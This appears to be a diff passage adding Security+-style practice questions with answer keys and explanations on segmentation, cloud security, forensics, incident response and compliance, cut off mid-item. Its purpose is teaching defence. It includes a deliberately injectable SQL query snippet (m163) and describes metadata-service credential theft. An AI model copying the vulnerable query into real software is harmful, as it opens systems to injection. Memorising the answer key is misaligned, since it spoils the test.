+      "q": "An organisation wants to ensure that a compromised guest WiFi client cannot attack internal corporate systems. Which network architecture feature MOST directly achieves this?",
+      "opts": [
+        "WPA3 encryption on the guest network",
+        "Network segmentation with firewall rules between guest and corporate VLANs",
+        "MAC address filtering on the wireless controller",
+        "Disabling SSID broadcasting"
+      ],
+      "correct": 1,
+      "exp": "Network segmentation with firewall rules between the guest and corporate VLANs is the most direct control — it enforces a security boundary at Layer 3, blocking traffic between the two segments regardless of what the guest device does. WPA3 encrypts wireless traffic but doesn't prevent lateral movement between network segments. MAC filtering is easily bypassed. SSID hiding is security through obscurity."
+    },
+    {
+      "id": "m148",
+      "ch": "3",
+      "difficulty": "easy",
+      "topic": "Cloud Architecture",
+      "q": "In the AWS Shared Responsibility Model for IaaS (EC2 instances), which of the following is the CUSTOMER'S responsibility?",
+      "opts": [
+        "Physical server hardware maintenance",
+        "Hypervisor patching and security",
+        "Guest operating system patching and hardening",
+        "Data centre physical access controls"
+      ],
+      "correct": 2,
+      "exp": "In IaaS, the customer is responsible for guest OS patching and hardening, application security, data, and IAM configuration. The cloud provider is responsible for physical infrastructure (hardware, datacentres), the hypervisor, and the network fabric. This division is the \"shared responsibility model\" — a critical concept in cloud security."
+    },
+    {
+      "id": "m149",
+      "ch": "3",
+      "difficulty": "medium",
+      "topic": "Cloud Architecture",
+      "q": "An organisation wants to discover unsanctioned cloud services being used by employees without IT approval. Which technology is BEST suited for this purpose?",
+      "opts": [
+        "Next-Generation Firewall (NGFW)",
+        "Cloud Access Security Broker (CASB)",
+        "Data Loss Prevention (DLP)",
+        "Security Information and Event Management (SIEM)"
+      ],
+      "correct": 1,
+      "exp": "A CASB (Cloud Access Security Broker) provides visibility into cloud service usage, including unsanctioned \"shadow IT\" applications. It sits between users and cloud services to enforce security policies. NGFW inspects traffic but doesn't provide cloud-specific visibility and policy. DLP prevents data leakage. SIEM aggregates and correlates logs for security events."
+    },
+    {
+      "id": "m150",
+      "ch": "3",
+      "difficulty": "hard",
+      "topic": "Cloud Architecture",
+      "q": "A development team uses a Kubernetes cluster where a compromised container attempts to access the cloud provider's instance metadata service at 169.254.169.254 to steal IAM credentials. Which TWO controls MOST directly prevent this?",
+      "opts": [
+        "IMDSv2 enforcement (session-oriented metadata requests) combined with Kubernetes NetworkPolicies blocking pod access to 169.254.169.254",
+        "Increasing container CPU limits",
+        "Enabling container image scanning",
+        "Using namespace isolation only"
+      ],
+      "correct": 0,
+      "exp": "IMDSv2 requires a PUT request to create a session token before metadata can be retrieved — simple SSRF exploits that perform direct GET requests are blocked. Kubernetes NetworkPolicies can block pod-level access to the metadata IP entirely. Both together provide layered defence. Image scanning detects known vulnerabilities but not this runtime attack. Namespace isolation alone doesn't block network access to the metadata service."
+    },
+    {
+      "id": "m151",
+      "ch": "3",
+      "difficulty": "easy",
+      "topic": "Infrastructure Security",
+      "q": "Which device operates at OSI Layer 3 and makes forwarding decisions based on destination IP addresses?",
+      "opts": [
+        "Hub",
+        "Layer 2 switch",
+        "Router",
+        "Repeater"
+      ],
+      "correct": 2,
+      "exp": "A router operates at OSI Layer 3 (Network layer) and forwards packets based on destination IP addresses using routing tables. A hub operates at Layer 1 (physical) and broadcasts to all ports. A Layer 2 switch operates at Layer 2 (Data Link) using MAC addresses. A repeater regenerates signals at Layer 1."
+    },
+    {
+      "id": "m152",
+      "ch": "3",
+      "difficulty": "medium",
+      "topic": "Infrastructure Security",
+      "q": "An organisation configures its switches so that only one MAC address is permitted per access port, and any violation shuts down the port. Which feature is being used?",
+      "opts": [
+        "Dynamic ARP Inspection",
+        "DHCP Snooping",
+        "Port security",
+        "802.1X Network Access Control"
+      ],
+      "correct": 2,
+      "exp": "Port security on managed switches limits the number of MAC addresses permitted on a port. Violation actions include shutdown (disable port), restrict (drop violating frames), or protect (drop silently). This prevents rogue device connection and some forms of VLAN attacks. DAI validates ARP packets. DHCP Snooping validates DHCP traffic. 802.1X provides authentication before network access."
+    },
+    {
+      "id": "m153",
+      "ch": "3",
+      "difficulty": "medium",
+      "topic": "Network Architecture",
+      "q": "Which IPSec mode encrypts ONLY the payload of the original IP packet while preserving the original IP header, and is used for end-to-end host-to-host VPN?",
+      "opts": [
+        "Tunnel mode",
+        "Transport mode",
+        "AH (Authentication Header) mode",
+        "GRE mode"
+      ],
+      "correct": 1,
+      "exp": "IPSec Transport mode encrypts only the IP payload (data), leaving the original IP header intact. It is used for direct host-to-host communication where both endpoints support IPSec. Tunnel mode encapsulates the entire original packet (header + payload) in a new IP packet — used for site-to-site VPNs. AH provides authentication and integrity but not confidentiality. GRE is a tunneling protocol, not an IPSec mode."
+    },
+    {
+      "id": "m154",
+      "ch": "3",
+      "difficulty": "hard",
+      "topic": "Infrastructure Security",
+      "q": "A healthcare organisation connects medical IoT devices (infusion pumps, patient monitors) to its network. These devices cannot be patched and run embedded operating systems. Which architecture decision provides the MOST effective security?",
+      "opts": [
+        "Connect them to the main corporate network with antivirus",
+        "Place them on a dedicated, isolated VLAN with strict firewall rules allowing only necessary clinical system communication",
+        "Disable all network features on the medical devices",
+        "Apply GPO policies to the devices"
+      ],
+      "correct": 1,
+      "exp": "Placing unpatched IoT/medical devices on a dedicated isolated VLAN with strict firewall rules (allowing only required clinical system ports) is the most effective control. This network segmentation limits exposure — if a device is compromised, the attacker cannot reach other systems. IoT devices often cannot run antivirus or accept GPOs. Disabling network features defeats clinical functionality."
+    },
+    {
+      "id": "m155",
+      "ch": "3",
+      "difficulty": "medium",
+      "topic": "Application Security",
+      "q": "Which security activity, performed during the DESIGN phase of the SDLC, identifies potential threats and security requirements BEFORE code is written — reducing remediation cost the most?",
+      "opts": [
+        "Dynamic Application Security Testing (DAST)",
+        "Penetration testing",
+        "Threat modelling",
+        "Static Application Security Testing (SAST)"
+      ],
+      "correct": 2,
+      "exp": "Threat modelling in the design phase identifies potential threats, attack vectors, and security requirements before development begins. Fixing design flaws is far cheaper than fixing code or production issues. DAST tests running applications (test/staging phase). Penetration testing occurs pre-production or post-deployment. SAST analyses source code during development."
+    },
+    {
+      "id": "m156",
+      "ch": "3",
+      "difficulty": "hard",
+      "topic": "Application Security",
+      "q": "A company stores API keys for third-party services hardcoded in application source code pushed to a public GitHub repository. Which type of vulnerability is this, and what is the recommended long-term remediation?",
+      "opts": [
+        "SQL injection — use parameterised queries",
+        "Hardcoded credentials / secrets in source code — use a secrets management solution (e.g., HashiCorp Vault, AWS Secrets Manager) and rotate the exposed keys immediately",
+        "Insecure direct object reference — implement authorisation checks",
+        "Cross-site scripting — implement output encoding"
+      ],
+      "correct": 1,
+      "exp": "Hardcoded credentials in source code is a critical vulnerability — especially in public repositories where they are immediately scraped by automated bots. Immediate action: rotate all exposed keys. Long-term: use a secrets management solution that injects secrets at runtime, implement pre-commit hooks with secret scanning (GitGuardian, git-secrets), and enforce a never-commit-secrets policy."
+    },
+    {
+      "id": "m157",
+      "ch": "3",
+      "difficulty": "medium",
+      "topic": "Cloud Architecture",
+      "q": "An organisation uses Infrastructure as Code (IaC) and wants to detect security misconfigurations in Terraform templates before deployment. Which type of tool should be integrated into the CI/CD pipeline?",
+      "opts": [
+        "Web Application Firewall (WAF)",
+        "IaC security scanning tool (e.g., Checkov, tfsec, Terrascan)",
+        "Network vulnerability scanner",
+        "Endpoint Detection and Response (EDR)"
+      ],
+      "correct": 1,
+      "exp": "IaC security scanning tools (Checkov, tfsec, Terrascan) analyse Infrastructure as Code templates for security misconfigurations (open security groups, public S3 buckets, missing encryption) before resources are deployed. Integrating them in CI/CD enforces \"shift left\" security. WAFs protect running applications. Network scanners and EDR operate on deployed infrastructure."
+    },
+    {
+      "id": "m158",
+      "ch": "3",
+      "difficulty": "easy",
+      "topic": "Network Architecture",
+      "q": "Which network security concept describes the principle that network trust should NEVER be assumed based on network location — even for users inside the corporate network — and every access request must be verified?",
+      "opts": [
+        "Defence in depth",
+        "Perimeter security",
+        "Zero Trust Architecture",
+        "Security through obscurity"
+      ],
+      "correct": 2,
+      "exp": "Zero Trust Architecture operates on \"never trust, always verify.\" It does not grant implicit trust based on network location (inside the corporate firewall). Every access request requires authentication, authorisation, and continuous verification regardless of source. Defence in depth layers controls. Perimeter security assumes internal traffic is trusted — the opposite of Zero Trust."
+    },
+    {
+      "id": "m159",
+      "ch": "3",
+      "difficulty": "medium",
+      "topic": "Infrastructure Security",
+      "q": "An organisation implements full disk encryption on all laptops. A laptop is stolen. The thief removes the hard drive and connects it to another machine. Which statement is TRUE about the data's confidentiality?",
+      "opts": [
+        "The data is compromised because the thief has physical access",
+        "The data remains protected because FDE encrypts all data on the drive and requires the encryption key to read it",
+        "The data is protected only if the laptop has a BIOS password",
+        "The data is compromised because antivirus cannot run on a removed drive"
+      ],
+      "correct": 1,
+      "exp": "Full Disk Encryption (FDE) encrypts all data on the drive, including the operating system. Without the encryption key (typically protected by a TPM chip, PIN, or passphrase), data on the removed drive is unreadable ciphertext — even when connected to another machine. FDE directly addresses the theft/loss threat model. A BIOS password alone does not protect data on a removed drive."
+    },
+    {
+      "id": "m160",
+      "ch": "3",
+      "difficulty": "hard",
+      "topic": "Application Security",
+      "q": "A security engineer reviews a software bill of materials (SBOM) and finds that an open-source library used in a production application has a published CVE with a CVSS score of 8.9. The library has not been updated in 3 years. Which control MOST directly reduces this risk?",
+      "opts": [
+        "Deploy a WAF in front of the application",
+        "Update the library to the current patched version, or replace it with an actively maintained alternative",
+        "Add monitoring to detect exploitation attempts",
+        "Encrypt all data processed by the application"
+      ],
+      "correct": 1,
+      "exp": "The most direct remediation for a known CVE in a dependency is to update to the patched version or replace the library. An SBOM makes this visibility possible. Keeping an unpatched dependency exposes the application regardless of other controls. WAF and monitoring are compensating controls — useful while patching but not a substitute. Encryption does not address code vulnerabilities."
+    },
+    {
+      "id": "m161",
+      "ch": "3",
+      "difficulty": "easy",
+      "topic": "Cloud Architecture",
+      "q": "Which cloud deployment model combines an organisation's private on-premises infrastructure with public cloud resources, with orchestration between them?",
+      "opts": [
+        "Public cloud",
+        "Private cloud",
+        "Community cloud",
+        "Hybrid cloud"
+      ],
+      "correct": 3,
+      "exp": "A hybrid cloud integrates on-premises private infrastructure with public cloud services, allowing workloads to move between them as needs change. Organisations use hybrid cloud for data sovereignty (sensitive data on-premises) while leveraging cloud elasticity. Public cloud is entirely operated by a provider. Private cloud is dedicated to one organisation. Community cloud is shared among organisations with common interests."
+    },
+    {
+      "id": "m162",
+      "ch": "3",
+      "difficulty": "medium",
+      "topic": "Infrastructure Security",
+      "q": "An organisation's Recovery Time Objective (RTO) is 6 hours and its Recovery Point Objective (RPO) is 2 hours. A disaster occurs at 10:00 AM. Last backup was completed at 08:30 AM. What can be concluded?",
+      "opts": [
+        "Both RTO and RPO will be violated",
+        "RPO can be met; RTO depends on recovery time. The 08:30 backup is 1.5 hours before the incident — within the 2-hour RPO",
+        "The backup is too old — RPO is violated",
+        "RPO is violated; RTO is met"
+      ],
+      "correct": 1,
+      "exp": "RPO (2 hours): The 08:30 backup is 1.5 hours before the 10:00 disaster — within the 2-hour RPO window. RPO is met. RTO (6 hours): The system must be operational by 16:00 (10:00 + 6h). Whether RTO is met depends on how long actual recovery takes from the 08:30 backup. The scenario confirms RPO compliance; RTO outcome is not yet determined."
+    },
+    {
+      "id": "m163",
+      "ch": "3",
+      "difficulty": "medium",
+      "topic": "Application Security",
+      "q": "A developer uses the following code to build a SQL query: query = \"SELECT * FROM products WHERE id=\" + userInput. Which remediation eliminates the SQL injection risk?",
+      "opts": [
+        "Wrapping userInput in double quotes",
+        "Using a prepared statement: query = \"SELECT * FROM products WHERE id=?\", bind(userInput)",
+        "Adding a length check on userInput",
+        "Converting userInput to uppercase before use"
+      ],
+      "correct": 1,
+      "exp": "Prepared statements (parameterised queries) separate SQL code structure from user-supplied data. The query structure is sent to the database engine first; user input is then bound as a data parameter — it is never interpreted as SQL syntax regardless of its content. Length checks and quoting can be bypassed. Case conversion has no effect on SQL injection."
+    },
+    {
+      "id": "m164",
+      "ch": "3",
+      "difficulty": "hard",
+      "topic": "Network Architecture",
+      "q": "An organisation implements a proxy server that decrypts outbound TLS traffic, inspects it for malicious content, re-encrypts it, and forwards it to the destination. What is this technique called, and what PKI requirement must be met for it to work?",
+      "opts": [
+        "VPN tunneling — no PKI requirement",
+        "TLS/SSL inspection (SSL interception) — the proxy's CA certificate must be trusted by all client browsers/devices",
+        "ARP inspection — the proxy must be on the same subnet",
+        "Port mirroring — traffic is copied without modification"
+      ],
+      "correct": 1,
+      "exp": "TLS/SSL inspection (also called SSL interception or \"man-in-the-middle proxy\") decrypts, inspects, and re-encrypts TLS traffic. For this to work without browser warnings, the proxy's CA certificate must be installed as a trusted root CA on all client devices — clients will see a certificate issued by the proxy CA rather than the original server's CA. This is used for malware detection and DLP in enterprise environments."
+    },
+    {
+      "id": "m165",
+      "ch": "3",
+      "difficulty": "easy",
+      "topic": "Infrastructure Security",
+      "q": "Which security feature in modern CPUs marks specific memory regions as non-executable, preventing shellcode injected into data areas (heap, stack) from running?",
+      "opts": [
+        "Address Space Layout Randomisation (ASLR)",
+        "Data Execution Prevention (DEP) / NX (No-Execute) bit",
+        "Stack canaries",
+        "Control Flow Guard (CFG)"
+      ],
+      "correct": 1,
+      "exp": "DEP / NX bit marks memory pages as either writable (data) OR executable (code) — not both. This prevents attackers from injecting shellcode into data regions and executing it. ASLR randomises memory layout, making it harder to know where code is. Stack canaries detect stack overflows. CFG validates control-flow transfers to prevent exploitation of memory corruption."
+    },
+    {
+      "id": "m166",
+      "ch": "4",
+      "difficulty": "easy",
+      "topic": "Security Monitoring",
+      "q": "Which security technology aggregates log data from multiple sources across an organisation, correlates events, and generates alerts for potential security incidents?",
+      "opts": [
+        "Intrusion Prevention System (IPS)",
+        "Security Information and Event Management (SIEM)",
+        "Endpoint Detection and Response (EDR)",
+        "Data Loss Prevention (DLP)"
+      ],
+      "correct": 1,
+      "exp": "A SIEM centralises log collection from firewalls, servers, endpoints, and applications, applies correlation rules to detect patterns indicating security incidents, and provides alerting, dashboards, and reporting. IPS blocks malicious traffic at the network level. EDR monitors endpoint behaviour. DLP prevents unauthorised data exfiltration."
+    },
+    {
+      "id": "m167",
+      "ch": "4",
+      "difficulty": "medium",
+      "topic": "Security Monitoring",
+      "q": "A SOC analyst receives 2,000 alerts per day from an IDS, of which 98% are for legitimate traffic incorrectly flagged as malicious. What is this phenomenon called, and what is its primary risk?",
+      "opts": [
+        "False negative — the risk is missed threats",
+        "Alert fatigue from false positives — the risk is that analysts become desensitised and miss real threats buried in the noise",
+        "True positive — the risk is over-response",
+        "Signature drift — the risk is outdated detection rules"
+      ],
+      "correct": 1,
+      "exp": "Alert fatigue caused by high false positive rates is a critical SOC challenge. When analysts are overwhelmed by alerts for benign activity, they become desensitised — increasing the risk that real threats are dismissed or missed. Remediation: tune detection rules, add contextual correlation, implement alert triage workflows, and reduce noise through SOAR automation."
+    },
+    {
+      "id": "m168",
+      "ch": "4",
+      "difficulty": "easy",
+      "topic": "Incident Response",
+      "q": "According to NIST SP 800-61, which is the CORRECT order of the incident response lifecycle phases?",
+      "opts": [
+        "Detection → Containment → Eradication → Recovery → Post-Incident",
+        "Preparation → Detection & Analysis → Containment, Eradication & Recovery → Post-Incident Activity",
+        "Identification → Containment → Recovery → Lessons Learned → Preparation",
+        "Triage → Investigation → Containment → Communication → Closure"
+      ],
+      "correct": 1,
+      "exp": "NIST SP 800-61 defines four phases: (1) Preparation — establish capabilities. (2) Detection and Analysis — identify and triage incidents. (3) Containment, Eradication and Recovery — stop, remove, restore. (4) Post-Incident Activity — lessons learned. This sequence is frequently tested on Security+."
+    },
+    {
+      "id": "m169",
+      "ch": "4",
+      "difficulty": "medium",
+      "topic": "Incident Response",
+      "q": "During incident response to a confirmed ransomware infection, which action should be performed FIRST?",
+      "opts": [
+        "Restore data from the most recent backup",
+        "Identify the ransomware variant and pay the ransom",
+        "Isolate affected systems from the network to prevent further spread",
+        "Format all affected hard drives"
+      ],
+      "correct": 2,
+      "exp": "Containment comes first — isolating affected systems from the network stops ransomware from spreading to additional hosts, network shares, and backup systems. Restoration (recovery) comes only after eradication is complete. Paying ransom is generally discouraged and not a recommended IR step. Formatting without forensic imaging destroys evidence needed for investigation."
+    },
+    {
+      "id": "m170",
+      "ch": "4",
+      "difficulty": "medium",
+      "topic": "Digital Forensics",
+      "q": "A forensic investigator must ensure that evidence collected from a seized hard drive is admissible in court. Which practice is MOST critical for maintaining admissibility?",
+      "opts": [
+        "Using commercial forensic software",
+        "Maintaining a complete and unbroken chain of custody",
+        "Completing the analysis within 48 hours",
+        "Creating a compressed archive of the drive"
+      ],
+      "correct": 1,
+      "exp": "Chain of custody documents every person who handled evidence, when, and what actions were taken. An unbroken chain of custody is legally required for digital evidence to be admissible in court — it demonstrates the evidence has not been tampered with. Using specific software and timing may be best practice but are secondary to chain of custody."
+    },
+    {
+      "id": "m171",
+      "ch": "4",
+      "difficulty": "hard",
+      "topic": "Digital Forensics",
+      "q": "A forensic analyst must collect volatile data from a running Windows system before shutting it down. Which is the CORRECT order for capturing volatile data, according to the order of volatility?",
+      "opts": [
+        "Hard disk → RAM → Network connections → Running processes",
+        "CPU registers and cache → RAM → Network connections → Running processes → Disk",
+        "Running processes → Hard disk → RAM → CPU cache",
+        "Disk image → RAM → Swap file → Network connections"
+      ],
+      "correct": 1,
+      "exp": "RFC 3227 defines the order of volatility from most to least volatile: CPU registers/cache → RAM → Network connections/state → Running processes → Temporary files (swap) → Disk. Data in CPU registers is lost immediately on shutdown; disk data persists. Volatile data must be captured first because it is destroyed when the system powers off."
+    },
+    {
+      "id": "m172",
+      "ch": "4",
+      "difficulty": "easy",
+      "topic": "Vulnerability Management",
+      "q": "Which type of vulnerability scan logs into target systems using valid credentials to enumerate installed software, patch levels, and configuration settings from the inside?",
+      "opts": [
+        "External unauthenticated scan",
+        "Credentialed (authenticated) scan",
+        "Passive network scan",
+        "Social engineering assessment"
+      ],
+      "correct": 1,
+      "exp": "A credentialed (authenticated) scan uses valid credentials (SSH, WMI, SMB) to log into target systems and enumerate installed software, patches, registry settings, and configurations — providing far more comprehensive and accurate results than unauthenticated scans. Unauthenticated scans see only externally exposed services. Passive scans analyse existing traffic without active probing."
+    },
+    {
+      "id": "m173",
+      "ch": "4",
+      "difficulty": "medium",
+      "topic": "Vulnerability Management",
+      "q": "A vulnerability scan returns a finding classified as \"High\" with a CVSS Base Score of 7.8. However, the affected system is an isolated internal test server with no production data and no internet connectivity. Which factor should be considered to accurately adjust the remediation priority?",
+      "opts": [
+        "The CVSS Base Score alone is sufficient for all prioritisation decisions",
+        "Environmental factors such as exposure, data sensitivity, and business criticality should reduce the effective priority",
+        "The finding should be ignored because it is not internet-facing",
+        "High findings must always be remediated within 24 hours regardless of context"
+      ],
+      "correct": 1,
+      "exp": "CVSS Environmental metrics adjust the Base Score based on organisation-specific context — including the system's role, data sensitivity, and exposure. An isolated test server with no production data and no internet access significantly reduces the real-world risk compared to the same vulnerability on an internet-facing production server. Risk-based prioritisation considers business context, not just base score."
+    },
+    {
+      "id": "m174",
+      "ch": "4",
+      "difficulty": "hard",
+      "topic": "Vulnerability Management",
+      "q": "Which framework provides a list of actively exploited vulnerabilities that CISA mandates US federal agencies remediate within specified timeframes, and is also used by private sector organisations for prioritisation?",
+      "opts": [
+        "CVSS scoring system",
+        "NIST National Vulnerability Database (NVD)",
+        "CISA Known Exploited Vulnerabilities (KEV) Catalog",
+        "MITRE ATT&CK Framework"
+      ],
+      "correct": 2,
+      "exp": "The CISA Known Exploited Vulnerabilities (KEV) Catalog lists vulnerabilities with confirmed active exploitation in the wild. US federal agencies (under BOD 22-01) must remediate KEV-listed vulnerabilities within defined timeframes. Private sector organisations use KEV alongside CVSS and EPSS (Exploit Prediction Scoring System) for risk-based remediation prioritisation. Presence in KEV significantly elevates remediation urgency."
+    },
+    {
+      "id": "m175",
+      "ch": "4",
+      "difficulty": "easy",
+      "topic": "Identity Management",
+      "q": "A user who transferred from the Finance department to HR six months ago still retains all Finance system access in addition to their new HR access. This is an example of:",
+      "opts": [
+        "Separation of duties violation",
+        "Privilege creep",
+        "Excessive onboarding",
+        "Role conflict"
+      ],
+      "correct": 1,
+      "exp": "Privilege creep is the gradual accumulation of access rights beyond what is required for a user's current role — typically caused by inadequate deprovisioning during role changes. Remediation: periodic access recertification reviews that identify and remove obsolete permissions. Role changes should trigger automatic revocation of previous role access."
+    },
+    {
+      "id": "m176",
+      "ch": "4",
+      "difficulty": "medium",
+      "topic": "Security Monitoring",
+      "q": "A threat hunter hypothesises that attackers may be using legitimate Windows administration tools (PsExec, WMI) for lateral movement. Which data source would be MOST useful for investigating this hypothesis?",
+      "opts": [
+        "Firewall deny logs",
+        "Windows Security Event Log (especially Event IDs 4624, 4688, 7045)",
+        "DHCP server logs",
+        "Physical access control logs"
+      ],
+      "correct": 1,
+      "exp": "Windows Security Event Logs contain key events for lateral movement investigation: Event 4624 (successful logon — Logon Type 3 = network), Event 4688 (new process creation, including PsExec), Event 7045 (new service installed — common PsExec indicator). These provide the process execution and authentication data needed to confirm or refute the hypothesis. Firewall deny logs show blocked connections, not successful lateral movement."
+    },
+    {
+      "id": "m177",
+      "ch": "4",
+      "difficulty": "medium",
+      "topic": "Incident Response",
+      "q": "Which type of backup copies ONLY data that has changed since the LAST FULL backup, and requires only the most recent full backup plus this backup for a complete restore?",
+      "opts": [
+        "Incremental backup",
+        "Differential backup",
+        "Full backup",
+        "Snapshot backup"
+      ],
+      "correct": 1,
+      "exp": "A differential backup captures all changes since the last full backup. Restoration requires only two backups: the last full + the latest differential. An incremental backup captures changes since the LAST BACKUP OF ANY TYPE — restoration requires the full backup plus ALL subsequent incrementals. Differentials are faster to restore but slower to back up than incrementals."
+    },
+    {
+      "id": "m178",
+      "ch": "4",
+      "difficulty": "hard",
+      "topic": "Digital Forensics",
+      "q": "A forensic analyst creates a forensic image of a suspect hard drive using dd and records SHA-256 hashes of both the original and the image. Three weeks later, in court, the defence challenges the evidence's integrity. Which practice MOST effectively defeats this challenge?",
+      "opts": [
+        "Testifying that the analyst is experienced",
+        "Presenting the matching SHA-256 hash values of the original and image, demonstrating bit-for-bit integrity, documented in the chain of custody at the time of imaging",
+        "Showing that the forensic software is NIST-validated",
+        "Providing a copy of the forensic report"
+      ],
+      "correct": 1,
+      "exp": "Matching SHA-256 hashes recorded at the time of imaging, preserved in chain of custody documentation, mathematically proves the forensic image is a bit-for-bit copy of the original. Any modification to the image — even a single bit — would produce a completely different hash. This cryptographic integrity proof is the standard method for defending evidence admissibility in court."
+    },
+    {
+      "id": "m179",
+      "ch": "4",
+      "difficulty": "easy",
+      "topic": "Security Monitoring",
+      "q": "A network-based IDS that analyses traffic patterns and alerts on deviations from an established baseline of normal behaviour is using which detection method?",
+      "opts": [
+        "Signature-based detection",
+        "Anomaly-based (behavioural) detection",
+        "Heuristic analysis",
+        "Protocol analysis"
+      ],
+      "correct": 1,
+      "exp": "Anomaly-based (behavioural) detection establishes a baseline of normal network behaviour and alerts on deviations. It can detect novel, previously unseen attacks that have no signature. The trade-off is higher false positive rates — normal but unusual activity may trigger alerts. Signature-based detection matches known attack patterns. Heuristic analysis evaluates code behaviour. Protocol analysis validates protocol conformance."
+    },
+    {
+      "id": "m180",
+      "ch": "4",
+      "difficulty": "hard",
+      "topic": "Identity Management",
+      "q": "An organisation implements a Privileged Access Management (PAM) solution. Which capability MOST directly reduces the risk of privileged credential theft?",
+      "opts": [
+        "Requiring administrators to use their normal user accounts for all tasks",
+        "Vaulting privileged account credentials, checking them out for individual sessions, and automatically rotating them after use",
+        "Renaming the default Administrator account",
+        "Requiring 16-character passwords for privileged accounts"
+      ],
+      "correct": 1,
+      "exp": "PAM credential vaulting and rotation means privileged passwords are stored in an encrypted vault, checked out for individual sessions, and automatically rotated after use — attackers who steal a credential find it already rotated and useless. This eliminates persistent privileged credentials. Renaming admin accounts is trivially defeated. Long passwords help against brute force but don't address credential theft. Using normal accounts for all tasks removes necessary administrative capability."
+    },
+    {
+      "id": "m181",
+      "ch": "4",
+      "difficulty": "medium",
+      "topic": "Vulnerability Management",
+      "q": "A penetration tester has been hired to assess an organisation's security without any prior knowledge of the internal architecture, simulating a real-world external attacker. Which test type is this?",
+      "opts": [
+        "White-box test",
+        "Grey-box test",
+        "Black-box test",
+        "Red team exercise"
+      ],
+      "correct": 2,
+      "exp": "A black-box penetration test provides the tester with no prior knowledge of the target — simulating an external attacker. White-box provides full architectural knowledge and source code access. Grey-box provides partial knowledge (e.g., credentials but no source code). A red team exercise is a comprehensive, adversary simulation that includes physical, social, and technical elements over a longer timeframe."
+    },
+    {
+      "id": "m182",
+      "ch": "4",
+      "difficulty": "medium",
+      "topic": "Incident Response",
+      "q": "After a security incident, the organisation holds a structured meeting to review what happened, what worked, what didn't, and how to improve. Which incident response activity is this?",
+      "opts": [
+        "Tabletop exercise",
+        "Root cause analysis",
+        "Post-incident review (lessons learned)",
+        "Threat hunting"
+      ],
+      "correct": 2,
+      "exp": "A post-incident review (lessons learned) is conducted after an incident is resolved to document the timeline, evaluate the effectiveness of the response, identify gaps, and improve processes for future incidents. A tabletop exercise is a proactive simulation before an incident. Root cause analysis identifies the technical cause of the incident (a component of the review). Threat hunting proactively searches for indicators of compromise."
+    },
+    {
+      "id": "m183",
+      "ch": "4",
+      "difficulty": "hard",
+      "topic": "Security Monitoring",
+      "q": "A SOC implements a SOAR (Security Orchestration, Automation, and Response) platform. Which capability MOST distinguishes SOAR from a traditional SIEM?",
+      "opts": [
+        "SOAR collects logs from more sources than a SIEM",
+        "SOAR executes automated response playbooks to contain and remediate incidents without manual intervention",
+        "SOAR provides better dashboards than a SIEM",
+        "SOAR replaces the need for EDR solutions"
+      ],
+      "correct": 1,
+      "exp": "The defining capability of SOAR is automated response — executing predefined playbooks to perform actions (quarantine a host, block an IP, create a ticket, notify a user) automatically when triggered by an alert. SIEM aggregates and correlates; SOAR acts. SOAR reduces analyst workload on repetitive tasks and improves response speed. It complements — not replaces — SIEM and EDR."
+    },
+    {
+      "id": "m184",
+      "ch": "4",
+      "difficulty": "easy",
+      "topic": "Identity Management",
+      "q": "An organisation requires that users accessing the VPN from personal devices meet minimum security requirements (updated antivirus, current OS patches) before being granted network access. Which technology enforces this?",
+      "opts": [
+        "Multi-factor authentication",
+        "Network Access Control (NAC) with posture assessment",
+        "Virtual Desktop Infrastructure (VDI)",
+        "Content filtering"
+      ],
+      "correct": 1,
+      "exp": "Network Access Control (NAC) with posture assessment evaluates the security state of a connecting device (OS patch level, AV status, firewall enabled) before granting network access. Non-compliant devices are redirected to a remediation VLAN. MFA verifies identity but not device health. VDI provides a hosted desktop but doesn't enforce device health at the network level. Content filtering controls web access."
+    },
+    {
+      "id": "m185",
+      "ch": "4",
+      "difficulty": "medium",
+      "topic": "Vulnerability Management",
+      "q": "A security team uses threat intelligence feeds to update their SIEM with current Indicators of Compromise (IoCs). Which type of threat intelligence format provides machine-readable, structured IoC data designed for automated consumption?",
+      "opts": [
+        "PDF threat reports",
+        "STIX/TAXII",
+        "Email newsletters",
+        "Blog posts"
+      ],
+      "correct": 1,
+      "exp": "STIX (Structured Threat Information eXpression) defines a standardised language for describing cyber threat information (IoCs, TTPs, threat actors). TAXII (Trusted Automated eXchange of Indicator Information) is the transport protocol for sharing STIX data. Together, they enable automated machine-to-machine threat intelligence exchange and SIEM integration. PDF reports and blog posts are human-readable but not machine-readable."
+    },
+    {
+      "id": "m186",
+      "ch": "5",
+      "difficulty": "easy",
+      "topic": "Governance & Compliance",
+      "q": "Which regulation primarily governs the protection of personal data belonging to individuals in the European Union, and imposes fines of up to 4% of global annual revenue for serious violations?",
+      "opts": [
+        "HIPAA",
+        "PCI DSS",
+        "GDPR",
+        "SOX"
+      ],
+      "correct": 2,
+      "exp": "GDPR (General Data Protection Regulation) governs the processing of personal data of EU/EEA residents, regardless of where the processing organisation is located. Maximum fines: €20 million or 4% of global annual turnover, whichever is higher. HIPAA governs US healthcare data. PCI DSS governs payment card data. SOX governs US public company financial reporting."
+    },
+    {
+      "id": "m187",
+      "ch": "5",
+      "difficulty": "medium",
+      "topic": "Governance & Compliance",
+      "q": "Under GDPR, a personal data breach that is likely to result in high risk to individuals must be reported to the supervisory authority within how many hours of the organisation becoming aware?",
+      "opts": [
+        "24 hours",
+        "48 hours",
+        "72 hours",
+        "7 days"
+      ],
+      "correct": 2,
+      "exp": "GDPR Article 33 requires notification to the supervisory authority within 72 hours of becoming aware of a personal data breach. If it poses high risk to individuals, Article 34 also requires notification to affected data subjects without undue delay. This is one of GDPR's most operationally challenging requirements — organisations need mature incident response processes to meet this deadline."
+    },
+    {
+      "id": "m188",
+      "ch": "5",
+      "difficulty": "easy",
+      "topic": "Risk Management",
+      "q": "An organisation identifies a vulnerability but determines that the cost of patching exceeds the potential financial loss if the vulnerability were exploited, and formally documents this decision. Which risk response strategy is this?",
+      "opts": [
+        "Risk avoidance",
+        "Risk mitigation",
+        "Risk acceptance",
+        "Risk transference"
+      ],
+      "correct": 2,
+      "exp": "Risk acceptance is a deliberate, documented decision to acknowledge a risk and take no action to reduce it — typically when remediation costs exceed potential impact. It must be formally approved by management and documented. Risk avoidance eliminates the activity creating risk. Risk mitigation reduces likelihood or impact. Risk transference shifts risk to a third party (e.g., insurance)."
+    },
+    {
+      "id": "m189",
+      "ch": "5",
+      "difficulty": "medium",
+      "topic": "Risk Management",
+      "q": "An organisation calculates the following: Asset Value = £500,000. Exposure Factor = 40%. Annual Rate of Occurrence = 0.25. What is the Annualised Loss Expectancy (ALE)?",
+      "opts": [
+        "£50,000",
+        "£200,000",
+        "£500,000",
+        "£125,000"
+      ],
+      "correct": 0,
